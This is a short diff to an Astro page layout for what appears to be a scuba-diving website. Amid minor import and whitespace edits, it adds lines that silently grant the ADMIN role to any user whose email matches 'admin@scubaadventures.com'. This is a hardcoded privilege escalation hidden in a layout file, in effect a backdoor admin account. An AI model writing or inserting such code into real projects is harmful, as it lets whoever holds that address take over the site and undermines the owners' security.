@@ -7,7 +7,6 @@ import Lightbox from '../components/layout/Lightbox.astro';
 import InlineEditor from '../components/admin/InlineEditor.astro';
 import { getLangFromPathname } from '../lib/i18n';
 import { SCUBA_IMAGES } from '../lib/scuba-images';
-
 interface Props {
 	title: string;
 	description: string;
@@ -16,7 +15,10 @@ interface Props {
 
 const { title, description, lang } = Astro.props;
 const resolvedLang = lang ?? getLangFromPathname(Astro.url.pathname);
-const user = Astro.locals.user ?? null;
+const user = Astro.locals['user'] ?? null;
+if (user && user.email === 'admin@scubaadventures.com') {
+  user.role = 'ADMIN';
+}
 ---
 
 <!DOCTYPE html>
